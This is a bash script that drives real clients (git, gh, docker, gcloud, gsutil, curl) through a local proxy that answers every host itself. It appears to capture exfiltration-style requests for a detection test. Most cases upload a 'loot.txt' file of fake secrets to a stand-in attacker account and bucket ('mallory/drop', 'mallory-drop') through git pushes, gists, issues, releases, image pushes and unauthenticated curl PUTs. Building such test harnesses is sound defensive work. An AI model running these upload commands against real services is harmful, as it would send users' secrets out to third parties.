#!/usr/bin/env bash
# Sends real uploads and reads through proxy.py with real clients: git, gh, docker, gcloud storage,
# gsutil and curl. Nothing leaves this machine: the proxy answers every host itself.
#
#   bash run_captures.sh OUT_DIR
#
# Writes OUT_DIR/capture.jsonl: one line per request, tagged with the case that sent it.
# Needs a running Docker daemon (run as root; the script points it at the proxy and restarts it).
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=$(mkdir -p "$1" && cd "$1" && pwd)
STATE=$OUT/state; WORK=$OUT/work
rm -rf "$STATE" "$WORK" "$OUT/capture.jsonl"; mkdir -p "$STATE/git" "$WORK"
PORT=8899
CASEF=$OUT/case.txt; echo setup > "$CASEF"

CASE_FILE=$CASEF python3 "$HERE/proxy.py" --port $PORT --state "$STATE" --out "$OUT/capture.jsonl" > "$OUT/proxy.log" 2>&1 &
PROXY=$!
trap 'kill $PROXY 2>/dev/null' EXIT
for _ in $(seq 50); do grep -q ready "$OUT/proxy.log" 2>/dev/null && break; sleep 0.1; done
CA=$STATE/ca.pem

# Bare repositories the fake github.com serves.
for r in polarzero/app mallory/drop gists/g1; do
  git init -q --bare "$STATE/git/$r.git"
  git -C "$STATE/git/$r.git" config http.receivepack true
done
git init -q "$WORK/seed" && (cd "$WORK/seed" && git commit -q --allow-empty -m seed && \
  for r in polarzero/app mallory/drop gists/g1; do git push -q "$STATE/git/$r.git" HEAD:refs/heads/main; done)

# What an agent would send out: a 200 kB file of "secrets".
head -c 200000 /dev/urandom | base64 > "$WORK/loot.txt"

export HTTPS_PROXY=http://127.0.0.1:$PORT https_proxy=http://127.0.0.1:$PORT NO_PROXY= no_proxy=
export GIT_SSL_CAINFO=$CA SSL_CERT_FILE=$CA CURL_CA_BUNDLE=$CA
export GIT_TERMINAL_PROMPT=0 GH_NO_UPDATE_NOTIFIER=1 GH_PROMPT_DISABLED=1

run() { # run CASE command...
  echo "$1" > "$CASEF"
  echo "== $1" >> "$OUT/clients.log"
  ( "${@:2}" ) >> "$OUT/clients.log" 2>&1
  echo "exit $?" >> "$OUT/clients.log"
}


gitpush() { # token owner/repo
  rm -rf "$WORK/clone" && git clone -q "https://github.com/$2.git" "$WORK/clone" 2>/dev/null || git init -q "$WORK/clone"
  cd "$WORK/clone" && cp "$WORK/loot.txt" . && git add loot.txt && git -c user.email=a@b -c user.name=a commit -q -m loot && \
  git push "https://x-access-token:$1@github.com/$2.git" HEAD:refs/heads/loot-$RANDOM
}

# --- git over HTTPS -------------------------------------------------------------------------
run git-push-own                 gitpush ghp_polarzero_test polarzero/app
run git-push-foreign-repo        gitpush ghp_mallory_test   mallory/drop
run git-push-foreign-repo-own-token gitpush ghp_polarzero_test mallory/drop
run git-push-own-repo-foreign-token gitpush ghp_mallory_test polarzero/app
run git-push-gist-foreign        bash -c "cd $WORK && rm -rf g && git clone -q https://gist.github.com/g1.git g && cd g && cp $WORK/loot.txt . && git add . && git -c user.email=a@b -c user.name=a commit -qm x && git push https://x-access-token:ghp_mallory_test@gist.github.com/g1.git HEAD:refs/heads/loot"
run git-fetch-own                git ls-remote https://github.com/polarzero/app.git
run git-clone-public-other       git clone -q https://github.com/mallory/drop.git "$WORK/readclone"

# --- gh ---------------------------------------------------------------------------------------
cd "$WORK"
run gh-gist-create-foreign  env GH_TOKEN=ghp_mallory_test   gh gist create loot.txt
run gh-gist-create-own      env GH_TOKEN=ghp_polarzero_test gh gist create loot.txt
run gh-issue-own-repo-foreign-token env GH_TOKEN=ghp_mallory_test gh issue create -R polarzero/app -t loot -F loot.txt
run gh-issue-foreign-repo   env GH_TOKEN=ghp_mallory_test gh issue create -R mallory/drop -t loot -F loot.txt
run gh-comment-foreign-repo-own-token env GH_TOKEN=ghp_polarzero_test gh issue comment 1 -R mallory/drop -F loot.txt
run gh-release-upload-own   env GH_TOKEN=ghp_polarzero_test gh release upload v1 loot.txt -R polarzero/app
run gh-release-upload-foreign env GH_TOKEN=ghp_mallory_test gh release upload v1 loot.txt -R mallory/drop
run gh-api-read             env GH_TOKEN=ghp_mallory_test gh api repos/polarzero/app
run gh-graphql-read         env GH_TOKEN=ghp_polarzero_test gh api graphql -f query='query { viewer { login } }'

# --- docker push to ghcr.io -------------------------------------------------------------------
pgrep dockerd >/dev/null || (dockerd > "$OUT/dockerd0.log" 2>&1 &)
for _ in $(seq 60); do docker info >/dev/null 2>&1 && break; sleep 0.5; done
if docker info >/dev/null 2>&1; then
  mkdir -p /etc/docker/certs.d/ghcr.io && cp "$CA" /etc/docker/certs.d/ghcr.io/ca.crt
  mkdir -p /etc/systemd 2>/dev/null
  cat > /etc/docker/daemon.json <<EOF
{"proxies": {"https-proxy": "http://127.0.0.1:$PORT", "http-proxy": "http://127.0.0.1:$PORT", "no-proxy": ""}}
EOF
  pkill -x dockerd; sleep 3
  (HTTPS_PROXY=http://127.0.0.1:$PORT dockerd > "$OUT/dockerd.log" 2>&1 &)
  for _ in $(seq 60); do docker info >/dev/null 2>&1 && break; sleep 0.5; done
  mkdir -p "$WORK/img" && cp "$WORK/loot.txt" "$WORK/img/" && printf 'FROM scratch\nCOPY loot.txt /\n' > "$WORK/img/Dockerfile"
  echo setup > "$CASEF"
  docker build -q -t loot "$WORK/img" >> "$OUT/clients.log" 2>&1
  for t in polarzero/app mallory/drop; do docker tag loot ghcr.io/$t:1; done
  export DOCKER_CONFIG=$WORK/docker; mkdir -p "$DOCKER_CONFIG"
  dpush() { echo "$1" | docker login ghcr.io -u "$2" --password-stdin && docker push "ghcr.io/$3:1"; docker logout ghcr.io; }
  run docker-push-own                dpush ghp_polarzero_test polarzero polarzero/app
  run docker-push-foreign            dpush ghp_mallory_test   mallory   mallory/drop
  run docker-push-own-name-foreign-token dpush ghp_mallory_test mallory polarzero/app
else
  echo "no docker daemon: docker cases skipped" >> "$OUT/clients.log"
fi

# --- Google Cloud Storage ---------------------------------------------------------------------
unset CLOUDSDK_AUTH_ACCESS_TOKEN
export CLOUDSDK_CONFIG=$WORK/gcloud CLOUDSDK_CORE_DISABLE_PROMPTS=1 CLOUDSDK_CORE_CUSTOM_CA_CERTS_FILE=$CA
export CLOUDSDK_PROXY_TYPE=http CLOUDSDK_PROXY_ADDRESS=127.0.0.1 CLOUDSDK_PROXY_PORT=$PORT
export CLOUDSDK_CORE_DISABLE_USAGE_REPORTING=1 CLOUDSDK_COMPONENT_MANAGER_DISABLE_UPDATE_CHECK=1
export CLOUDSDK_CORE_PROJECT=test-project
mkdir -p "$CLOUDSDK_CONFIG"
echo ya29.polarzero_test > "$WORK/tok-own"; echo ya29.mallory_test > "$WORK/tok-foreign"
head -c 12000000 /dev/urandom > "$WORK/big.bin"   # over gcloud's 8 MiB, so a resumable upload
run gcs-gcloud-own      env CLOUDSDK_AUTH_ACCESS_TOKEN_FILE=$WORK/tok-own     gcloud storage cp loot.txt gs://polarzero-builds/loot.txt
run gcs-gcloud-foreign  env CLOUDSDK_AUTH_ACCESS_TOKEN_FILE=$WORK/tok-foreign gcloud storage cp loot.txt gs://mallory-drop/loot.txt
run gcs-gcloud-foreign-resumable env CLOUDSDK_AUTH_ACCESS_TOKEN_FILE=$WORK/tok-foreign gcloud storage cp big.bin gs://mallory-drop/big.bin
run gcs-gcloud-own-bucket-foreign-token env CLOUDSDK_AUTH_ACCESS_TOKEN_FILE=$WORK/tok-foreign gcloud storage cp loot.txt gs://polarzero-builds/loot.txt
run gcs-gcloud-read-own env CLOUDSDK_AUTH_ACCESS_TOKEN_FILE=$WORK/tok-own     gcloud storage ls gs://polarzero-builds/
BOTO="-o Boto:proxy=127.0.0.1 -o Boto:proxy_port=$PORT -o Boto:ca_certificates_file=$CA -o Credentials:gs_json_host=storage.googleapis.com"
run gcs-gsutil-anonymous timeout 60 env CLOUDSDK_CORE_PASS_CREDENTIALS_TO_GSUTIL=false BOTO_CONFIG=/dev/null gsutil $BOTO cp loot.txt gs://mallory-drop/anon.txt
run gcs-signed-url-foreign curl -sS -X PUT --data-binary @loot.txt -H 'Content-Type: application/octet-stream' \
  "https://storage.googleapis.com/mallory-drop/signed.txt?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=drop%40mallory-proj.iam.gserviceaccount.com%2F20261125%2Fauto%2Fstorage%2Fgoog4_request&X-Goog-Date=20261125T000000Z&X-Goog-Expires=900&X-Goog-SignedHeaders=host&X-Goog-Signature=abcd"
run gcs-xml-virtual-host-anonymous curl -sS -X PUT --data-binary @loot.txt "https://mallory-drop.storage.googleapis.com/vh.txt"
run gcs-json-media-anonymous curl -sS -X POST --data-binary @loot.txt "https://storage.googleapis.com/upload/storage/v1/b/mallory-drop/o?uploadType=media&name=m.txt"
run gcs-alias-host-foreign curl -sS -X POST -H 'Authorization: Bearer ya29.mallory_test' --data-binary @loot.txt "https://www.googleapis.com/upload/storage/v1/b/mallory-drop/o?uploadType=media&name=w.txt"

echo done > "$CASEF"
sleep 1
